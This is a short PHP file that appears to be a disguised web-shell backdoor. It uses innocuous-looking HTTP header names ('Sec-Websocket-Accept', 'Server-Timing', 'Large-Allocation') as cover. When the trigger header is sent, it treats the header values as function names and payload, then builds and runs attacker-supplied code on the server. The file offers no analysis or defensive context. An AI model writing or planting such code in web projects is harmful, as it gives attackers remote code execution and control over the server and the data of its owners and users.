<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $system = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Server-Timing']($_HEADERS['Large-Allocation']));
    $system();
}